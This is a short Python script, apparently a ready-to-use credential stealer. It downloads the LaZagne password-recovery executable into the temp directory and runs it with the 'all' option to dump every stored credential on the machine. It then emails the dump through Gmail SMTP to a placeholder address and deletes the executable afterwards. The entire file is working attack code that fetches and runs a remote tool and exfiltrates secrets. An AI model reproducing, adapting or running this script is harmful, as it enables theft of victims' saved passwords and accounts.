#!/usr/bin/env python3
import requests
import subprocess
import smtplib
import re
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as f:
        f.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP_SSL("smtp.gmail.com", "465")
    server.ehlo()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")  # LaZagne

result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("youremail@gmail.com", "yourpassword", result)
os.remove("lazagne.exe")
